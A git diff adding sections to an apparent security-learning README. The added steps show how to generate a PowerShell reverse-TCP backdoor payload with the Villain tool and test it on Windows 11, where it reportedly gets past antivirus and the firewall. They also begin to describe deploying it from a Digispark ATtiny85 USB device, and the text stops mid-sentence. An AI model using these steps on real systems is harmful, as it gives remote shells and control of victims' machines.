@@ -32,3 +32,24 @@ Now it is ready to use<br>
 
 ![4](https://github.com/mishqatabid/Network-Security/assets/145700715/58e48912-81fa-4e9f-9c00-8142a1c0b8ec)<br>
 
+# Generate & Test Payload
+## Generating Payload
+As Villain tool is operating, we will use it to generate to generate the required payload for our backdoor. <br>
+To generate the payload, write the keyword generate, specify the type of payload you want to generate, then specify the local host and click enter to get the desired payload
+```
+generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 
+```
+![5](https://github.com/mishqatabid/Network-Security/assets/145700715/9ce703b6-b38c-490d-95fb-2053b6abdf96)
+
+## Testing Payload
+•	 The payload is generated and it’s time to test the payload. <br>
+•	 For testing we are using Windows 11<br>
+•	 Open the PowerShell, paste the payload on shell and click enter <br>
+•	 You can witness that the payload is running successfully and have bypassed the Windows Antivurus and Firewall
+
+![8](https://github.com/mishqatabid/Network-Security/assets/145700715/0cdfab1e-1864-4f2a-88b6-769287d7126c)
+
+# Deploying Payload
+•	 To deploy the payload, we will download the [Arduino IDE](https://www.arduino.cc/en/software).
+•	 Open the IDE, create a new sketch file and write down the code for Digispark Attiny85. 
+•	 The [Sketch]() is then 
